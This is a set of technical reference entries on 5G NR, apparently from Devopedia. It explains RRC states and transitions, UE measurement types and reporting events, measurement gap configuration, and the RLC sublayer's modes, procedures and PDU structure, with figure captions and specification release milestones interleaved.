RRC_CONNECTED to RRC_IDLE is via RRC Connection Release procedure with network - initiated RRCRelease message .
Upper layers in the UE may also request a release .
RRC connection is also released due to radio link failure , handover failure or cell not meeting cell selection criteria .
RRC_CONNECTED to RRC_INACTIVE is network initiated .
It 's entered via RRCRelease message with ` suspendConfig ` information element ( IE ) .
When UE is using a Dual Active Protocol Stack ( DAPS ) bearer or is redirected to an inter - RAT carrier frequency , this IE is not configured .
RRC_INACTIVE to RRC_CONNECTED is triggered by the network via RAN paging .
A paged UE will start with the RRC Connection Resume procedure consisting of three messages : RRCResumeRequest , RRCResume ( or RRCSetup ) , RRCResumeComplete ( or RRCSetupComplete ) .
This procedure can also be initiated by UE for uplink transfer , including RNA update .
RRC_INACTIVE to RRC_IDLE happens when the network responds to an RRCResumeRequest with RRCRelease .
Alternatively , the UE may be asked to remain in RRC_INACTIVE for some more time .
How do UE RRC states map to states in other layers of the protocol stack ?
RRC states mapped to MM and CM states with comparison between LTE and 5G. Source : da Silva et al .
2016 , slide 5 .
When RRC is in either RRC_INACTIVE or RRC_CONNECTED states , there 's a Non - Access Stratum ( NAS ) connection between the UE and the CN .
Thus , Connection Management ( CM ) is in the Connected state .
In RRC_CONNECTED , Mobility Management ( MM ) may be in either Deregistered or Registered state .
If the UE is in the process of registering to the network ( attach procedure ) , then MM is in a deregistered state .
Otherwise , it 's in the registered state .
When a UE is just powered up , RRC is in RRC_IDLE and MM is in Deregistered state .
After MM registration , RRC can move from RRC_CONNECTED to RRC_INACTIVE , and return to RRC_IDLE only as part of deregistration ( detach procedure ) .
It 's also possible for a UE to move to RRC_IDLE and still be available for CN - initiated paging .
For simplicity , this case is not shown in the figure .
Could you describe RRC states and transitions across different cellular generations ?
RRC states and transitions across 3 G UTRA , 4 G E - UTRA and 5 G NR .
Source : Won and Choi 2020 , fig .
3 .
Reselection can happen in idle states .
In 2 G , GSM_Idle and GPRS Packet_Idle are the idle states .
In 3 G , reselection is also possible from connected states Cell_FACH , Cell_PCH and URA_PCH .
Reselection is possible from GPRS Packet Transfer Mode .
Cell Change Order ( CCO ) is possible from 2 G idle state , GPRS Packet Transfer Mode and E - UTRA RRC Connected .
For reselection from UTRAN to GERAN , CCO can be assisted by Network Assisted Cell Change ( NACC ) .
In connected states , handovers are possible .
For handovers , relevant states are GSM_Connected , GPRS Packet Transfer Mode ( 2 G ) ; Cell_DCH ( 3 G ) ; E - UTRA RRC Connected ( 4 G ) ; and NR RRC_CONNECTED ( 5 G ) .
In the 5G - PPP European project METIS - II , the main 5 G pre - standards project , there 's discussion and effort towards supporting an RRC inactive state .
In June 2016 , a draft titled Draft Asynchronous Control Functions and Overall Control Plane Design was published with mention of RRC Connected Inactive state .
LTE Release 13 introduces RRC suspend / resume procedures .
Source : da Silva et al .
2019 .
LTE RRC specification TS 36.331 , Release 13 , version 13.2.0 is published .
In this release , LTE RRC has only two states , RRC_IDLE and RRC_CONNECTED .
This version includes suspending / resuming of RRC connection .
When suspended , RRC goes to RRC_IDLE .
However , the connection can be resumed with minimal signalling due to stored UE AS context .
This feature caters to NB - IoT requirements .
3GPP publishes Release 15 " early drop " .
In 5 G RRC specification TS 38.331 , version 15.0.0 , there are three states : RRC_IDLE , RRC_CONNECTED and RRC_INACTIVE .
RRC_INACTIVE state applies only in SA mode , that is , it 's not applicable in EN - DC ( E - UTRA - NR Dual Connectivity ) .
3GPP publishes version 1.0.0 of specification TS 38.304 titled User Equipment ( UE ) procedures in idle mode and in RRC Inactive state .
In June , it was re - versioned to 15.0.0 for Release 15 .
Version 16.3.0 comes out on January 2021 .
It 's mentioned that , " The UE initiates an RRC Connection Resume procedure upon receiving RAN initiated paging .
If the UE receives a CN initiated paging in RRC_INACTIVE state , the UE moves to RRC_IDLE and informs NAS .
" In LTE RRC specification TS 36.331 , version 15.3.0 , RRC_INACTIVE state is introduced .
At the same time , 5 G RRC specification TS 38.331 , version 15.3.0 includes ASN.1 definition for RRCRelease message .
These include ` suspendConfig ` IE that indicates transition to RRC_INACTIVE .
The Periodic RNA Update timer can range from 5 - 720 minutes .
RRC_INACTIVE state improves latency and reduces UE power consumption .
Source : Hailu et al .
2018 , fig .
3 .
Hailu et al .
publish performance analysis showing improvements due to RRC_INACTIVE state .
They use the term " RRC Connected Inactive " for this and refer to LTE Release 13 suspend / resume procedure as " RRC Suspended " .
Compared to LTE idle state , RRC_INACTIVE brings 8x latency improvement , 5x power efficiency and 3.5x less signalling .
3GPP publishes Release 16 specifications .
In 5 G RRC specification TS 38.331 , version 16.1.0 , ` preferredRRC - State ` IE is introduced as part of UE 's release preference .
UE can indicate preference towards RRC_IDLE , RRC_INACTIVE , leave RRC_CONNECTED without any preference for the next state or revert to an earlier indicated preference .
Measurements are essential to determine the health of any cellular system given the current configuration .
Measurements help the UE and the network make decisions so that resources are managed better and ultimately , quality of service is achieved .
Measurements are done by both UE and the network , although this article focuses only on measurements performed by a 5 G UE .
Typically , a UE measures downlink signals while the network measures uplink signals .
However , it 's possible for a UE to measure uplink signals sent by other UEs .
RRC manages measurement configuration .
Most measurements are executed at Layer 1 , although some may be at Layer 2 .
RRC does filtering on Layer 1 measurements .
If filtered measurements meet reporting criteria , they 're reported to the network .
Some measurements are reported by Layer 1 directly to the network .
While UE measures many different signals , the main ones are based on SSB and CSI - RS .
What are some acronyms pertaining to 5 G UE measurements ?
For convenience , we use these acronyms related to measurements in this article : Channel State Information ( CSI ) , Demodulation Reference Signal ( DMRS ) , Reference Signal ( RS ) , Reference Signal Received Power ( RSRP ) , Reference Signal Received Power per Branch ( RSRPB ) , Reference Signal Received Quality ( RSRQ ) , Received Signal Strength Indicator ( RSSI ) , Signal - to - Noise and Interference Ratio ( SINR ) , Synchronization Signal ( SS ) and Synchronization Signal Block ( SSB ) .
With respect to RRC states , what measurements are made by a 5 G UE ?
An essential UE procedure in RRC_IDLE is cell selection .
In RRC_IDLE and RRC_INACTIVE , the UE can also do cell reselection .
For both these procedures , UE measures the RSRP and RSRQ of a cell .
For cell reselection , if supported and enabled , UE may do Relaxed Measurements .
This is typically useful when the UE has low mobility or not at the cell edge .
If configured , a UE in RRC_IDLE or RRC_INACTIVE may collect measurements and report them later in RRC_CONNECTED .
This is called Logged Measurements .
It 's related to a feature called Minimization of Drive Test ( MDT ) .
In RRC_CONNECTED , the UE is configured via dedicated signalling to perform intra - frequency or inter - frequency NR measurements , or inter - RAT measurements for E - UTRA or UTRA - FDD frequencies .
The network uses these to decide on carrier aggregation , dual connectivity or handover .
What are some basic facts about 5 G UE measurements ?
SSB and CSI - RS configuration options .
Source : ShareTechnote 2021 .
For downlink channel sounding , 5 G NR uses two main downlink signals that a UE measures : SSB : Transmitted with a low duty cycle on a limited bandwidth compared to LTE 's Cell - Specific Reference Signals ( CRS ) that are sent on the entire channel bandwidth .
SSB measurements are used to determine path loss and average channel quality .
CSI - RS : Used for tracking rapidly changing channel conditions to support mobility and beam management .
In general , measurements in FR1 are from UE 's antenna connector .
In FR2 , measurements are based on the combined signal from antenna elements mapped to a given receive branch .
If UE is using receiver diversity , it reports the maximum value .
Although a UE can be configured for measurements early on , measurement reports can be sent to the network only after AS security activation .
Which are the main quantities measured by a 5 G UE ?
We describe the main UE measurements involving SS : SS - RSRP : Average power of resource elements carrying secondary synchronization signals .
In addition , resource elements of PBCH - DMRS and CSI - RS can be included .
SS - RSRPB : Similar to SS - RSRP but for each antenna connector ( FR1 ) or for each receiving branch ( FR2 ) .
Measurements can include PBCH - DMRS but not CSI - RS .
SS - RSRQ : Given N resource blocks within the measurement bandwidth , this is \(N \cdot SS{\text-}RSRP / RSSI_{NR\,Carrier}\ ) .
Both SS - RSRP and NR carrier RSSI are measured over the same resource blocks .
SS - SINR : This is SS - RSRP over average noise - plus - interference power .
The latter is measured based on RRC configuration or over the same resource elements as SS - RSRP measurement .
Equivalent measurements pertaining to CSI - RS are CSI - RSRP , CSI - RSRQ and CSI - SINR .
RSSI is average power over certain OFDM symbols in a measurement of bandwidth corresponding to channel bandwidth .
It includes co - channel serving and non - serving cells , adjacent channel interference , thermal noise , etc .
Which are some feature - specific measurements done by a 5 G UE ?
Measurements for inter - RAT include : IEEE 802.11 WLAN RSSI : for handovers to Wi - Fi Reference Signal Time Difference ( RSTD ) for E - UTRA : relative timing difference between an E - UTRA cell and the E - UTRA reference cell E - UTRA RSRP , RSRQ and RS - SINR UTRA FDD CPICH RSCP , UTRA FDD carrier RSSI and UTRA FDD CPICH Ec / No Measurements for MR - DC include : SFN and Frame Timing Difference ( SFTD ) : Measured between PCell and PSCell .
Measurements for sidelink channels include : Sidelink RSSI Sidelink Channel Occupancy Ratio ( SL CR ) , Sidelink Channel Busy Ratio ( SL CBR ) , PSBCH - RSRP , PSSCH - RSRP and PSCCH - RSRP . Measurements for UE positioning include : Timing between an E - UTRA cell and a GNSS - specific reference time DL PRS - RSRP measured on Positioning Reference Signal ( PRS ) DL Reference Signal Time Difference ( RSTD ) measures the relative time difference between a Transmission Point ( TP ) and the reference TP UE Rx – Tx time difference measured per TP SS Reference Signal Antenna Relative Phase ( SS - RSARP ) What are Cross Link Interference ( CLI ) measurements ?
CLI in time windows T2 and T4 .
Source : Venkatasubramanian and Queseth 2020 , fig .
1 .
CLI is a problem in TDD when a base station receiving the uplink is facing interference from another base station transmitting in the downlink .
It can happen across network operators due to out - of - band emissions .
CLI can be mitigated by time - synchronization across base stations , that is , they share a common clock , phase reference and frame structure .
Even within the same operator network , CLI can occur since cell neighbours may be using different TDD DL / UL patterns .
CLI can be mitigated by gNBs coordinating their configuration over Xn and F1 interfaces .
If capable , a 5 G UE measures and reports CLI - RSSI .
These reports can also include SRS - RSRP measurements on Sounding Reference Signal ( SRS ) , which are uplink signals coming from other UEs .
This quantifies interference on downlink due to nearby uplink transmissions .
Both CLI - RSSI and SRS - RSRP are measured within the active DL BWP .
These are applicable only to RRC_CONNECTED intra - frequency in TDD mode .
In EN - DC and NGEN - DC , Secondary Node ( SN ) configures CLI measurements .
In NE - DC , Master Node ( MN ) does it .
In NR - DC , both MN and SN can do this .
What 's the difference between 5 G NR L1 and L3 measurements ?
L1 reporting types are mapped into resource types .
Source : Dahlman et al .
2018 , table 8.1 .
RSRP , RSRQ , SINR , and RSSI are quantities measured at L1 , not L3 .
We use the term " L3 measurement " to imply that L3 does filtering on the values and does the final reporting .
Filtering is done to remove the effect of fast fading and ignore short - term variations .
Though L1 may collect measurements more often , L3 might report them at a larger configured periodicity .
Thus , L3 takes a longer - term view of channel conditions .
To avoid ping - pong behaviour and unnecessary reporting , L3 manages event - based reporting .
It evaluates reporting criteria to decide if a report needs to be sent .
Apart from thresholds , such criteria include hysteresis .
But L1 reports some measurements to quickly react to changing channel conditions .
Beam management is an example .
These are referred to as L1-RSCP and L1-SINR .
L1 reports are part of Channel State Information ( CSI ) .
CSI - RS measurements and L1 reporting can be periodic , semi - periodic ( activated / deactivated by MAC signalling ) or aperiodic ( triggered by DCI signalling ) .
L1 reporting is on PUCCH ( periodic , semi - periodic ) or PUSCH ( aperiodic , semi - periodic ) .
What L2 measurements are reported by a 5 G UE to the network ?
At Layer 2 , there 's measurement and reporting of UL PDCP delay for packets during the reporting period .
The Delay is reported at a granularity of 0.1ms per Data Radio Bearer ( DRB ) .
At most , one measurement identity per cell group has this quantity configured for reporting .
The corresponding measurement object is ignored .
The delay is in fact a queuing delay .
It 's the time taken to obtain uplink grant from the time packet enters PDCP from upper SAP .
It 's up to gNB to convert these per - DRB reports to delays at the level of QoS flows .
For completeness , we note that many more L2 measurements are done on the network side .
These are described in the TS 38.314 specification .
What 's in a typical 5 G NR measurement configuration ?
5 G NR measurement configuration and its execution .
Source : Devopedia 2021 .
A 5 G UE is given the following measurement details : Measurement Objects : Specifies what is to be measured .
For NR and inter - RAT E - UTRA measurements , this may include cell - specific offsets , blacklisted cells to be ignored and whitelisted cells to be considered for measurements .
Reporting Configuration : Specifies how reporting should be done .
This could be periodic or event - triggered .
Measurement ID : Identifies how to report measurements of a specific object .
This is a many - to - many map : a measurement object could have multiple reporting configurations , a reporting configuration could apply to multiple objects .
A unique ID is used for each object - to - report - config association .
When UE sends a MeasurementReport message , a single ID and related measurements are included in the message .
Quantity Configuration : Specifies parameters for layer 3 filtering of measurements .
Only after filtering , reporting criteria are evaluated .
The formula used is \(F_n = ( 1–a)*F_{n-1 } + a*M_n\ ) , where \(M\ ) is the latest measurement , \(F\ ) is the filtered measurement , and \(a\ ) is based on configured filter coefficient .
Measurement Gaps : Periods that the UE may use to perform measurements .
Which are the event - triggered measurements reported by 5 G UE RRC ?
Illustrating Event A2 .
Source : Adapted from Techplayon 2020a .
Events are triggered based on thresholds , hysteresis and sometimes offsets .
The RRC specification defines the following : Event A1 : Serving becomes better than threshold . Event A2 : Serving becomes worse than threshold . Event A3 : Neighbour becomes offset better than SpCell Event A4 : Neighbour becomes better than threshold Event A5 : SpCell becomes worse than threshold1 and neighbour becomes better than threshold2 Event A6 : Neighbour becomes offset better than SCell Event B1 : Inter RAT neighbour becomes better than threshold Event B2 : PCell becomes worse than threshold1 and inter RAT neighbour becomes better than threshold2 Event I1 : Interference becomes higher than threshold Event C1 : The NR sidelink channel busy ratio is above a threshold Event C2 : The NR sidelink channel busy ratio is below a threshold Only the serving cell is relevant for events A1 / A2 .
For other events , consider only whitelisted cells if enabled ; else consider any neighbour cell detected based on the measurement object configuration , provided it 's not on the blacklist .
Events B1 / B2 relate to inter - RAT .
They 're used in EN - DC deployments as well , where they 're reported via E - UTRA RRC signalling .
How do I interpret events used in event - triggered measurement reporting ?
A1 is typically used to cancel a handover procedure since the UE has re - established good coverage on the serving cell .
With A2 , UE has poor coverage on serving cell .
Since neighbour cell measurements are not available with A2 , the network can initiate a blind handover ; or provide UE configuration to perform neighbour cell measurements ( eg .
A3 or A5 ) .
Events A3 and A6 contain offsets specific to a neighboring cell .
Both involve relative measurements , that is , comparing one cell with another .
A3 may lead to intra- or inter - frequency handover away from the Special Cell ( SpCell ) .
A6 is relevant to carrier aggregation , where a Secondary Cell ( SCell ) is configured .
A6 may not result in a handover but instead reconfiguration of cell groups ( MCG or SCG ) .
A4 could trigger a handover but the decision is not based on radio conditions on the serving cell .
It could be for other reasons , such as load balancing .
B1 is similar to the inter - RAT case .
A5 can be seen as a combination of A2 and A4 , leading to intra- or inter - frequency handover .
B2 is similar to the inter - RAT case .
Which are the 3GPP specifications relevant to 5 G UE measurements ?
We note the following specifications : TS 37.340 : Multi - connectivity overall description : Stage-2 .
Specifies measurement model for multi - connectivity operation involving E - UTRA and NR .
TS 38.133 : Requirements for support of radio resource management .
Specifies measurement requirements ( including performance requirements ) , procedures and UE measurement capabilities .
TS 38.215 : Physical layer measurements .
Specifies measurement quantities .
TS 38.300 : NR and NG - RAN overall description : Stage-2 .
Specifies measurement model .
TS 38.304 : User Equipment ( UE ) procedures in idle mode and in RRC Inactive state .
Specifies cell reselection measurement rules and relaxed measurements .
TS 38.314 : Layer 2 measurements .
It specifies mostly network requirements , but section 4.3 is for UE .
TS 38.331 : Radio Resource Control ( RRC ) : protocol specification .
Specifies UE reporting of measurements .
TS 38.533 : User Equipment ( UE ) conformance specification : Radio Resource Management ( RRM ) .
Specification TS 28.552 : 5 G performance measurements is mostly about network - side measurements , including network slicing .
We mention it here for completeness .
3GPP publishes Release 15 " early drop " .
In 5 G RRC specification TS 38.331 , version 15.0.0 , measurement configurations specified include measurement objects , measurement identifies , reporting , gaps , L3 filtering , and events A1-A6 .
Measurements supported include SS - RSRP , SS - RSRQ , SS - CINR , CSI - RSRP , CSI - RSRQ , CSI - CINR , RSSI and more .
In TS 38.133 , version 16.2.0 , these are introduced : CLI measurements , UMTS inter - RAT measurements , SRVCC - related measurements , and more .
3GPP publishes Release 16 specifications .
In 5 G RRC specification TS 38.331 , version 16.3.1 , has a number of additions : measurement configuration for RRC_IDLE and RRC_INACTIVE ; CLI - RSSI and SRS - RSRP reporting ; sidelink and UTRA - FDD reporting ; UL PDCP delay reporting ; IEs ` UE - MeasurementsAvailable ` and ` needForGapsInfoNR ` as part of RRCReconfigurationComplete and RRCResumeComplete messages ; and UE positioning measurements .
Measurement gaps are opportunities given to the UE to perform measurements on downlink signals .
A UE ca n't perform inter - frequency or inter - RAT measurements while also transmitting or receiving .
Even for intra - frequency measurements , a 5 G UE may require measurement gaps if such measurements are to be performed outside the UE 's currently active Bandwidth Part ( BWP ) .
The network configures a UE with measurement gaps via RRC signalling .
The network configures these gaps such that they do n't coincide with UE transmissions or receptions .
It 's possible to start with a few gaps and later reconfigure the UE with more gaps to gather neighbour cell measurements , for instance if a handover seems likely .
Measurement gaps are periodic .
A UE may be configured with multiple measurement gaps .
UE RRC informs Layer 1 of these gaps .
Layer 1 obeys these gaps for making measurements .
Collected measurements are reported to the network either at Layer 1 or RRC .
What are the different types of 5 G NR measurement gaps ?
Measurement gaps in the Multi - RAT Dual Connectivity scenario indicate the Master Node ( MN ) and Secondary Node ( SN ) .
Source : Swamy 2020 .
There are three types of gap patterns : gapUE , gapFR1 , and gapFR2 .
More commonly , these are called per - UE or per - FR gap types .
If the UE is capable , the network may signal separate gap configurations for FR1 and FR2 .
Otherwise , gapUE is used , that is , these gaps can be used for measurements in both FR1 and FR2 .
When either gapFR1 or gapFR2 is configured , gapUE ca n't be configured for the UE .
In NGEN - DC and EN - DC , signalling is over E - UTRA , not 5 G NR .
Hence , gapFR1 and gapUE are set up by LTE RRC .
In NE - DC and NR - DC , signalling is over 5 G NR .
Hence , gapFR1 and gapUE are set up by NR RRC .
gapFR2 is always setup via NR RRC signalling .
In NR - DC , the gaps must be associated with MCG .
What constitutes a measurement gap configuration ?
Example measurement gap configuration .
Source : Swamy 2020 .
A measurement gap configuration has the following elements : Measurement Gap Repetition Period ( MGRP ) : Specifies the gap period .
Values include 20 , 40 , 80 , 160ms .
For example , for 40ms the gap repeats every four frames .
Gap Offset : Specifies the starting subframe when the gap starts .
Being relative to period , its range is 0 to mgrp-1 .
Measurement Gap Length ( MGL ) : Specifies the duration of the gap in milliseconds .
Values include 1.5 , 3 , 3.5 , 4 , 5.5 , and 6ms .
For positioning measurements , 10 and 20ms are applicable .
Measurement Gap Timing Advance ( MGTA ) : UE starts measurements in advance of the subframe when the gap starts .
This could be 0 , 0.25 or 0.5ms .
For FR2 , 0 and 0.25ms are applicable .
Reference Serving Cell Indicator : Applicable for NE - DC and NR - DC , this indicates which cell 's SFN and subframe number to use for gap calculation .
The 5 G system has what 's called a System Frame Number ( SFN ) , a frame being 10ms long .
This is divided into 10 subframes , each of 1ms duration .
A measurement gap is configured by the following equations : $ $ SFN\;mod\;(mgrp/10)\;=\;FLOOR(gapOffset/10)\\subframe\;=\;gapOffset\;mod\;10$$ Applying this to the figure , we get ` SFN mod 4 = 2 ` and ` subframe = 4 ` .
What are measurement gap pattern configurations ?
The standard specifies 26 different gap pattern configurations .
Each pattern is a combination of MGL and MGRP .
Not all patterns are always applicable .
The standard defines applicable patterns with respect to gap type , serving cell type , and measurement purpose .
A UE can indicate if it supports per - FR type .
Otherwise , it 's expected to support all gap pattern configurations that are applicable .
In 5 G NR , how does a measurement gap relate to SMTC ?
The SMTC window falls within a measurement gap .
Source : Techplayon 2020c .
To make neighbour cell measurements , the network informs the UE of the timing of neighbour cell SSBs via what 's called SSB Measurement Timing Configuration ( SMTC ) .
UE will measure all SSBs that fall within a configured SMTC window .
This window is contained with a measurement gap .
Network configures measurement gap length and SMTC window based on SSB burst periodicity .
SSB burst periodicity can have values of 5/10/20/40/80/160 milliseconds .
However , a UE in connected mode need not measure so often , particularly under good channel conditions .
In such cases , SMTC window periodicity can be longer .
Two examples are shown in the figure .
We also note that the entire measurement gap is usually not used for measurements .
A UE requires some time to retuning its RF transceivers .
Hence , the actual measurement duration is smaller than the measurement gap length .
Why does a 5 G UE require the Measurement Gap Timing Advance ( MGTA ) ?
An example of 0.5ms MGTA for synchronous EN - DC .
Source : ETSI 2021b , fig .
9.1.2 - 1b .
In some cases , the measurement gap starts at the same time as the SMTC window .
Given the time needed to correct RF , this implies that UE may miss some SSBs that it 's supposed to measure .
This is solved by informing the UE to advance the start of the configured measurement gap .
This advance is 0.5ms for FR1 and 0.25ms for FR2 .
What is the measurement gap sharing in 5 G NR ?
A UE may need measurement gaps for both intra - frequency and inter - frequency measurements ; or in either case , the SMTC window fully overlaps with the configured measurement gap .
In such cases , configured measurement gaps may need to be shared between intra - frequency and inter - frequency measurements .
The gaps could be per - UE or per - FR .
The share is determined by RRC signalling of \(X\ ) that can take four values : equal split , 25 , 50 , 75 .
It 's applied as follows : $ $ K_{intra } = 1 / X * 100 \\ K_{inter } = 1 / ( 100 – X ) * 100$$ Details of measurement gap sharing are defined in TS 38.133 for four scenarios : EN - DC , SA , NE - DC and NR - DC .
Sharing affects the calculation of the Carrier - Specific Scaling Factor ( CSSF ) that scales the measurement delay requirements defined in the standard .
What are autonomous gaps in 5 G NR ?
As part of the reporting configuration , the network may ask the UE to report Cell Group Identity ( CGI ) .
This report is not exactly a measurement , but it requires the UE to acquire system information from neighbour cells .
The relevant messages to decode are MIB and SIB1 .
To do this , IE ` useAutonomousGaps ` may be configured .
Autonomous gaps is when the network does n't configure measurement gaps for the UE .
UE autonomously selects suitable gaps to receive system information from neighbour cells .
3GPP publishes Release 15 " early drop " .
In this release , measurement gaps and gap patterns are partially defined .
Some details are marked for further study .
3GPP publishes Release 16 specifications .
SSB - based inter - frequency measurements can be done without measurement gaps if SSB is within active DL BWP of UE .
UE reports some measurements to assist the network configure measurement gaps for location - related measurements .
For positioning measurements , MGL of 10 and 20ms are introduced .
5 G NR RLC sublayer and its interfaces .
Source : Devopedia 2021 .
The Radio Link Control ( RLC ) sublayer of the 5 G NR protocol stack interfaces the PDCP sublayer from above and the MAC sublayer from below .
It interfaces with PDCP via RLC channels and with MAC via logical channels .
There 's a one - to - one mapping : RLC SDUs belonging to an RLC channel are mapped to a single logical channel .
An RLC entity in a 5 G UE has its peer RLC entity in the gNB , or other UEs in the case of NR sidelink communication .
An RLC entity can be configured in one of three transmission modes : Transparent Mode ( TM ) , Unacknowledged Mode ( UM ) and Acknowledged Mode ( AM ) .
Each mode supports a set of functions .
The mode is configured by RRC and depends on the higher layer service requirements .
What 's the architecture of the 5 G NR RLC sublayer ?
Overview model of 5 G NR RLC .
Source : ETSI 2021a , fig .
4.2.1 - 1 .
The RLC sublayer can have multiple RLC entities .
Each entity is in a specific mode .
In the transmit direction , an RLC entity receives RLC SDUs from PDCP on an RLC channel and sends out RLC PDUs to MAC on a logical channel .
An RLC PDU contains an RLC header plus RLC SDU , but the header is absent in TM .
TM and UM RLC entities are configured as either transmitting or receiving .
The AM RLC entity has both transmit and receive functionality .
Thus , TM and UM RLC entities are unidirectional whereas the AM RLC entity are bidirectional .
A single RLC entity is mapped to a single PDCP entity .
But a single PDCP entity can send its PDUs to a maximum of eight RLC entities .
For example , a bidirectional PDCP entity is mapped into two UM RLC entities , one for transmit and one for receive .
Dual Connectivity ( DC ) , Dual Active Protocol Stack ( DAPS ) and PDCP duplication are scenarios where a PDCP entity maps to more than one RLC entity .
For Integrated Access and Backhaul ( IAB ) , RLC 's upper layer is the Backhaul Adaptation Protocol ( BAP ) sublayer , not discussed here .
Which logical channels are carried by each RLC transmission mode ?
Logical channels BCCH , SBCCH , PCCH , and DL / UL CCCH are carried on TM .
These correspond to system broadcast , sidelink broadcast , paging and SRB0 signalling .
In UM , applicable logical channels are DL / UL DTCH , SCCH and STCH .
Signalling other than SRB0 goes at AM .
The corresponding logical channel is DL / UL DCCH .
User plane traffic on DL / UL DTCH is also carried in this mode .
Sidelink logical channels SCCH and STCH can go at AM .
Thus , Signalling Radio Bearers ( SRBs ) are mapped to either TM ( SRB0 ) or AM ( non - SRB0 ) .
Data Radio Bearers ( DRBs ) are mapped to either UM or AM , which is configured via RRC signalling .
What are the main functions of 5 G NR RLC ?
RLC functions mapped to TM , UM and AM .
Source : Devopedia 2021 .
All three modes can transfer upper layer PDUs .
The TM RLC entity is the simplest .
It does n't add any header or segment RLC SDUs .
An RLC PDU is simply an RLC SDU .
UM RLC entity segments RLC SDUs and adds a header to each RLC PDU .
In the receive direction , the entity reassembles the segments and delivers a complete RLC SDU to the upper layer .
The receiving entity may discard RLC segments and SDUs based on sequence number ( SN ) , reassembly window size and reassembly timer .
The AM RLC entity has the important feature of error correction through ARQ .
The receiving entity sends feedback on STATUS PDUs .
This tells the transmitting entity to retransmit PDUs not correctly received .
Thus , bidirectional transfer capability , acknowledgments and retransmission distinguish AM RLC entity .
It can detect and discard duplicate PDUs .
It supports segmentation , reassembly and discard functionalities , similar to the UM RLC entity .
In addition , AM RLC entity can re - segment previously lost or erroneous segments before retransmitting them .
What are data PDUs and control PDUs in 5 G NR RLC ?
RLC data PDUs carry upper layer PDUs .
These are named TMD PDU , UMD PDU and AMD PDU for the respective TM , UM and AM entities .
Apart from actual data traffic ( DTCH or STCH ) , these PDUs may carry control information from upper layers .
For example , all RRC signalling on SRBs is treated as data at the RLC sublayer .
RLC control PDUs are control information generated and consumed at RLC .
These are applicable only to AM RLC entities .
In Release 15 and 16 , the only such PDU is the STATUS PDU .
It 's sent by the receiving side of an AM RLC entity to inform the sending side about correctly received or lost RLC PDUs .
Via a feature called polling , indicated via the RLC header , the transmitting side can request the receiving side to send a STATUS PDU .
Control PDUs are sent on the same logical channels as the data PDUs of that AM RLC entity .
Could you describe the main procedures in 5 G NR RLC ?
RLC entity procedures include RLC establishment , re - establishment and release .
These are applicable to all transmission modes , though the details vary .
When a new radio bearer is configured , RLC establishment happens .
RLC re - establishment is initiated by the upper layers to recover from errors .
In this procedure , timers are stopped and reset ; state variables are reinitialized ; RLC SDUs , segments and PDUs are discarded .
The RLC release procedure happens when the RLC entity is no longer needed .
Data transfer procedures include specific transmit and receive procedures for TM , UM and AM entities .
This includes segmentation and reassembly ; handling of sequence numbers , window sizes and timers ; interfacing with PDCP and MAC ; and more .
The SDU discard procedure allows a higher layer to request UM or AM RLC entities to discard a particular RLC SDU , provided the SDU or its segment has not yet been submitted to MAC .
Data volume calculation is done at RLC for MAC to send Buffer Status Reports ( BSRs ) .
This calculation includes RLC SDUs and segments not yet part of RLC PDUs , RLC data PDUs ( initial or retransmit ) and the STATUS PDU .
How is 5 G NR RLC different from LTE RLC ?
Unlike LTE RLC , 5 G NR RLC does n't support concatenation .
Source : Dahlman et al .
2018 , fig .
6.10 .
Concatenation is when multiple RLC SDUs can be packed into a single RLC PDU .
Segmentation is when an RLC SDU is segmented and sent to multiple RLC PDUs .
LTE RLC can do both concatenation and segmentation whereas 5 G NR RLC is allowed to do only segmentation .
This design change relates to how 5 G NR RLC sends its PDUs to MAC .
LTE RLC concatenates SDUs and sends a single PDU to MAC per Transmission Time Interval ( TTI ) .
A 5 G NR RLC can send multiple PDUs to MAC on any given TTI .
5 G NR MAC packs them into a single MAC PDU for transmission .
This improves latency since the RLC can prepare its PDUs in advance even before the MAC informs how many bytes can be sent .
The other difference is that LTE RLC does in - sequence delivery of upper layer SDUs .
This is not required of 5 G NR RLC .
For improved latency , an RLC SDU can be delivered as soon as it 's received .
Any ordering that may be required is the role of PDCP .
What RLC parameters are configured by 5 G NR RRC ?
The RLC configuration is a per logical channel .
It 's independent of numerologies or transmission durations .
RRC provides the mapping between logical channel identify , radio bearer identity and RLC configuration .
For TM , there 's no configuration required from RRC .
The Sequence number field in the RLC header can be 6 or 12 bits for UM , and 12 or 18 bits for AM .
For SRBs other than SRB0 , AM uses 12-bit SN .
For groupcast and broadcast in sidelink , UM uses 6-bit SN .
The reassembly timer is also configured for UM and AM .
RRC signalling between UE and gNB defines this only for DL UM and AM .
For UL UM and AM , this timer is known within the gNB .
Additional parameters configured for AM include poll retransmit timer , status prohibit timer , pollPDU , pollByte , and maxRetxThreshold .
Polling parameters and maxRetxThreshold are on the transmit side of the AM RLC entity .
The status prohibit timer is on the receive side .
An early draft of 5 G NR RLC specification TS 38.322 was released .
This will evolve to version 1.0.0 by September .
3GPP publishes Release 15 " early drop " .
RLC specification TS 38.322 is updated to version 15.0.0 .
As part of Release 16 , TS 38.322 version 16.0.0 , RLC specification is updated for V2X sidelink communication .
3GPP publishes Release 16 specifications .
The RLC specification is TS 38.322 version 16.1.0 .
For AM , the poll retransmit timer and status prohibit timer are updated to include low timer values of 1ms , 2ms , 3ms and 4ms .
An RLC PDU contains a header plus an RLC SDU or its segment .
Source : ETSI 2021b , fig .
6.6 - 1 .
An RLC PDU ( Protocol Data Unit ) consists of an RLC header and data .
From the upper layer , the RLC receives an RLC SDU ( Service Data Unit ) .
The data part of an RLC PDU is either a complete RLC SDU or an SDU segment .
A single RLC PDU maps to a single MAC SDU .
RLC has three transmission modes : TM , UM and AM .
Each mode has its own data PDU formats .
STATUS PDU , which is an RLC control PDU sent as part of the AM RLC entity , has its own formats .
Every RLC SDU coming from the upper layer is byte aligned , that is , a multiple of 8 bits .
The first bit of RLC SDU becomes the first bit of RLC PDU .
UMD and AMD headers are byte aligned but not the STATUS PDU header .
What are some essential details when constructing an RLC PDU ?
RLC 's upper layer is either PDCP or BAP .
If the RLC SDU is from a PDCP , the maximum data field size in an RLC PDU is the maximum size of a PDCP PDU .
Unlike LTE RLC , 5 G NR RLC supports SDU segmentation but not concatenation .
This means that an RLC SDU can be sent in multiple segments , each segment going in a separate RLC PDU .
But a single RLC PDU ca n't carry multiple SDUs or their segments .
Since there 's no concatenation at RLC , RLC can start preparing the header for each RLC SDU before the transmission grant is received from MAC .
This reduces overall latency .
If the grant received is smaller than desired , RLC will segment the SDU , update the RLC header and construct the final RLC PDU .
The standards do n't specify a value for segment size .
If the grant is big enough , the entire SDU will go to a single PDU .
